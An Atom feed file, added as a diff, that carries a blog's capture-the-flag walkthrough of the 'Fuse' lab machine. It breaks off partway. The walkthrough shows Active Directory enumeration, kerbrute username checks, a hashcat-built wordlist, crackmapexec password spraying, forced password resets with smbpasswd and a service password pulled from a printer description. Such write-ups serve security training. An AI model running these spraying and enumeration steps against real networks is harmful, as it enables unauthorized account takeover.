@@ -1,0 +1,691 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+ <title>R0cK - Blog</title>
+ <link href="http://localhost:2222/atom.xml" rel="self"/>
+ <link href="http://localhost:2222/"/>
+ <updated>2020-11-07T15:25:49+01:00</updated>
+ <id>http://localhost:2222</id>
+ <author>
+   <name>Gregory Graindorge</name>
+   <email>gregory.graindorge@gmail.com</email>
+ </author>
+
+ 
+ <entry>
+   <title>FUSE - Walkthrough</title>
+   <link href="http://localhost:2222/2020/10/05/fuse/"/>
+   <updated>2020-10-05T00:00:00+02:00</updated>
+   <id>http://localhost:2222/2020/10/05/fuse</id>
+   <content type="html">&lt;p&gt;Fuse was very interesting. It requires to make a good enumeration but also to a have keen eye for details and a good understanding of what you’re doing overall. The root part is pretty straigthforward once you kwnow how to use the exploit properly. Very fun box!&lt;/p&gt;
+
+&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+
+&lt;p&gt;I start with a quick Nmap followed by a full scan with the default script (-C) and the -V tag to get more info about the services.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap fuse &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; fuse &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-05 05:15 EST
+Nmap scan report for fuse (10.10.10.193)
+Host is up (0.097s latency).
+Not shown: 988 filtered ports
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+
+Nmap done: 1 IP address (1 host up) scanned in 5.72 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-05 04:45 EST
+Nmap scan report for fuse (10.10.10.193)
+Host is up (0.094s latency).
+Not shown: 65514 filtered ports
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+80/tcp    open  http         Microsoft IIS httpd 10.0
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+80/tcp    open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn\'t have a title (text/html).
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-11-05 10:03:48Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc        Microsoft Windows RPC
+49680/tcp open  msrpc        Microsoft Windows RPC
+49694/tcp open  msrpc        Microsoft Windows RPC
+49701/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: mean: 2h55m04s, deviation: 4h37m09s, median: 15m02s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Fuse
+|   NetBIOS computer name: FUSE\x00
+|   Domain name: fabricorp.local
+|   Forest name: fabricorp.local
+|   FQDN: Fuse.fabricorp.local
+|_  System time: 2020-11-05T02:04:41-08:00
+| smb-security-mode: 
+|   account_used: &amp;lt;blank&amp;gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-11-05T10:04:40
+|_  start_date: 2020-11-05T09:45:42
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 287.84 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As you can see we have a bunch of ports open and the full scan reveals more informations :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;OS: Windows 2016&lt;/li&gt;
+  &lt;li&gt;Web Server: IIS 10.0&lt;/li&gt;
+  &lt;li&gt;Domain name: fabricorp.local&lt;/li&gt;
+  &lt;li&gt;FQDN: fuse.fabricorp.local&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Also WinRM (5985) is open, which can be very useful to get a foothold.&lt;/p&gt;
+
+&lt;p&gt;The first thing I do is adding the domain name my hosts file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;127.0.0.1	localhost
+127.0.1.1	kali
+
+&lt;span class=&quot;c&quot;&gt;# The following lines are desirable for IPv6 capable hosts
+&lt;/span&gt;
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+10.10.10.193	fuse fabricorp.local fuse.fabricorp.local&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Then I’d like to poke around with smb and other services but first lets have a look at port 80.&lt;/p&gt;
+
+&lt;p&gt;We know that we have a web server running so we can use nikto to gather useful informations from the server.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; http://fabricorp.local&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.193
++ Target Hostname:    fabricorp.local
++ Target Port:        80
++ Start Time:         2020-11-05 06:50:52 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Microsoft-IIS/10.0
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ 7785 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2020-11-05 07:04:02 (GMT-5) (790 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Nothing very interesting so lets open firefox and check the website manualy.&lt;/p&gt;
+
+&lt;p&gt;It seems to be some kind of print server. I don’t know Papercut so I tried to google it but I didn’t 
+find any vuln. Then I made some basic enumeration and again, didn’t find anything except these log files on the home page.&lt;/p&gt;
+
+&lt;h2 id=&quot;foothold--user&quot;&gt;Foothold / User&lt;/h2&gt;
+
+&lt;p&gt;I used &lt;strong&gt;&lt;cite&gt;Olevba&lt;/cite&gt;&lt;/strong&gt; to analyze the files and got a few users and filenames.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;olevba papercut-print-log-2020-05.csv&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;olevba 0.55.1 on Python 3.8.6 - http://decalage.info/python/oletools
+===============================================================================
+FILE: papercut-print-log-2020-05.csv
+Type: Text
+-------------------------------------------------------------------------------
+VBA MACRO papercut-print-log-2020-05.csv 
+in file: papercut-print-log-2020-05.csv - OLE stream: ''
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+PaperCut Print Logger - http://www.papercut.com/
+Time,User,Pages,Copies,Printer,Document Name,Client,Paper Size,Language,Height,Width,Duplex,Grayscale,Size
+2020-05-29 17:50:10,pmerton,1,1,HP-MFT01,&quot;New Starter - bnielson - Notepad&quot;,JUMP01,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,19kb,
+2020-05-29 17:53:55,tlavel,1,1,HP-MFT01,&quot;IT Budget Meeting Minutes - Notepad&quot;,LONWK015,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,52kb,
+2020-05-30 16:37:45,sthompson,1,1,HP-MFT01,&quot;backup_tapes - Notepad&quot;,LONWK019,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,20kb,
+2020-05-30 16:42:19,sthompson,1,1,HP-MFT01,&quot;mega_mountain_tape_request.pdf&quot;,LONWK019,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,104kb,
+2020-05-30 17:07:06,sthompson,1,1,HP-MFT01,&quot;Fabricorp01.docx - Word&quot;,LONWK019,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,153kb,
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|IOC       |http://www.papercut.|URL                                          |
+|          |com/                |                                             |
++----------+--------------------+---------------------------------------------+&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;usernames&quot;&gt;Usernames&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;sthompson&lt;/li&gt;
+  &lt;li&gt;pmerton&lt;/li&gt;
+  &lt;li&gt;tlavel&lt;/li&gt;
+  &lt;li&gt;bhult&lt;/li&gt;
+  &lt;li&gt;administrator&lt;/li&gt;
+  &lt;li&gt;bnielson&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Because port 88 (kerberos) is open, I can use Kerbrute and verify the usernames I found in log files.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;~/toolbox/kerbrute/dist/kerbrute_linux_amd64 userenum &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; fabricorp.local &lt;span class=&quot;nt&quot;&gt;--dc&lt;/span&gt; fuse &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9dad6e1) - 11/05/20 - Ronnie Flathers @ropnop
+
+2020/11/05 08:33:06 &amp;gt;  Using KDC(s):
+2020/11/05 08:33:06 &amp;gt;  	fuse:88
+
+2020/11/05 08:33:06 &amp;gt;  [+] VALID USERNAME:	 administrator@fabricorp.local
+2020/11/05 08:33:06 &amp;gt;  [+] VALID USERNAME:	 pmerton@fabricorp.local
+2020/11/05 08:33:06 &amp;gt;  [+] VALID USERNAME:	 sthompson@fabricorp.local
+2020/11/05 08:33:06 &amp;gt;  [+] VALID USERNAME:	 bhult@fabricorp.local
+2020/11/05 08:33:06 &amp;gt;  [+] VALID USERNAME:	 tlavel@fabricorp.local
+2020/11/05 08:33:06 &amp;gt;  [+] VALID USERNAME:	 bnielson@fabricorp.local
+2020/11/05 08:33:06 &amp;gt;  Done! Tested 6 usernames (6 valid) in 0.092 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Every users are valid users but I can’t go further with kerberos because I don’t have any password for these users.&lt;/p&gt;
+
+&lt;p&gt;There is an interesting file called &lt;strong&gt;&lt;cite&gt;‘New Starter - bnielson’&lt;/cite&gt;&lt;/strong&gt; and another one called &lt;strong&gt;&lt;cite&gt;‘Fabricorp01.docx’&lt;/cite&gt;&lt;/strong&gt;. I should investigate and check if the user bnielson has some sort of default password.&lt;/p&gt;
+
+&lt;p&gt;I should’ve tried directly the password Fabricorp01 but for some reasons it didn’t poped in my head so I tried different password lists but nothing worked. I decided to create a custom list based on the domain name (fabricorp).&lt;/p&gt;
+
+&lt;p&gt;For that, I used hashcat.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;fabricorp&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; tmp-password &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;tmp-password
+fabricorp&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;hashcat &lt;span class=&quot;nt&quot;&gt;--force&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--stdout&lt;/span&gt; tmp-password &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; /usr/share/hashcat/rules/best64.rule &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; /usr/share/hashcat/rules/toggles1.rule &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; tmp-passwords &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; tmp-passwords
+1155 tmp-passwords&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Then I used &lt;strong&gt;&lt;cite&gt;crackmapexec&lt;/cite&gt;&lt;/strong&gt; to brute force the password for user bnielson.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;crackmapexec smb fuse &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; bnielson &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; passwords&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp6 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp7 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp8 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp9 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp00 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp02 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp11 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp12 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp13 STATUS_LOGON_FAILURE&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Interestringly, if we use the password &lt;strong&gt;Fabricorp01&lt;/strong&gt;, we get the message &lt;strong&gt;&lt;cite&gt;STATUS_PASSWORD_MUST_CHANGE&lt;/cite&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;That happens because the user bnielson is suppose to change his password the first time he connects to the domain. Apparently here, bnielson didn’t connect to the domain yet.&lt;/p&gt;
+
+&lt;p&gt;Let’s see if other users have the same response from crackmapexec.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;crackmapexec smb fuse &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Fabricorp01'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\sthompson:Fabricorp01 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\pmerton:Fabricorp01 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\administrator:Fabricorp01 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Tlavel&lt;/em&gt;&lt;/strong&gt;, &lt;strong&gt;&lt;em&gt;bnielson&lt;/em&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;em&gt;bhult&lt;/em&gt;&lt;/strong&gt; have the same status. I’m gonna modify change the password for bnielson.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;smbpasswd &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 10.10.10.193 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; bnielson&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;crackmapexec smb fuse &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; bnielson &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ThanksF0rReading'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--shares&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\bnielson:ThanksF0rReading 
+SMB         10.10.10.193    445    FUSE             [+] Enumerated shares
+SMB         10.10.10.193    445    FUSE             Share           Permissions     Remark
+SMB         10.10.10.193    445    FUSE             -----           -----------     ------
+SMB         10.10.10.193    445    FUSE             ADMIN$                          Remote Admin
+SMB         10.10.10.193    445    FUSE             C$                              Default share
+SMB         10.10.10.193    445    FUSE             HP-MFT01                        HP-MFT01
+SMB         10.10.10.193    445    FUSE             IPC$                            Remote IPC
+SMB         10.10.10.193    445    FUSE             NETLOGON        READ            Logon server share 
+SMB         10.10.10.193    445    FUSE             print$          READ            Printer Drivers
+SMB         10.10.10.193    445    FUSE             SYSVOL          READ            Logon server share &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It works ! We have now access to the shares but after a few minutes, the passwords is being reseted and I can’t access to the shares anymore. Maybe I should try another user. Let’s try with tlavel and bhult.&lt;/p&gt;
+
+&lt;p&gt;The same problem happens !&lt;/p&gt;
+
+&lt;p&gt;Some kind of process reset all the passords after one or two minutes so I guess we just need to be quick to connect to smb. Also we need to put a different password everytime we change it because it keeps track of the old passwords.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Fabricorp01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;ThanksF0rReading1111&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;ThanksF0rReading1111&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | smbpasswd &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 10.10.10.193 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; tlavel&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;smbpasswd &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 10.10.10.193 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; bnielson&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'tlavel'&lt;/span&gt; //10.10.10.193/SYSVOL&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After a bit of borring smb enumeration, I didn’t find anything very userful so I’m gonna move on with rpc and see what we’ll get.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Fabricorp01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;ThanksF0rReading222&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;ThanksF0rReading222&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | smbpasswd &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 10.10.10.193 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; tlavel&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'tlavel%ThanksF0rReading222'&lt;/span&gt; fuse&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Rpcclient gives us more users. Let’s grab these and keep them in a file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;enumdomusers&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[svc-print] rid:[0x450]
+user:[bnielson] rid:[0x451]
+user:[sthompson] rid:[0x641]
+user:[tlavel] rid:[0x642]
+user:[pmerton] rid:[0x643]
+user:[svc-scan] rid:[0x645]
+user:[bhult] rid:[0x1bbd]
+user:[dandrews] rid:[0x1bbe]
+user:[mberbatov] rid:[0x1db1]
+user:[astein] rid:[0x1db2]
+user:[dmuir] rid:[0x1db3]&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;tmp-users | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'[][]'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/^$/d'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;rpc-users&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;Administrator
+Guest
+krbtgt
+DefaultAccount
+svc-print
+bnielson
+sthompson
+tlavel
+pmerton
+svc-scan
+bhult
+dandrews
+mberbatov
+astein
+dmuir&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I removed Ghuest, krbtgt and DefaultAccount from the list.&lt;/p&gt;
+
+&lt;p&gt;Because we are on a print server, it worths to check the printers via rpcclient.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;enumprinters&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;	flags:[0x800000]
+	name:[\\FUSE\HP-MFT01]
+	description:[\\FUSE\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
+	comment:[]&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great! We found a password. 
+I’m gonna use that password with the user list that we got earlier.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;cme smb fuse &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; rpc-users &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$fab@s3Rv1ce$1'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
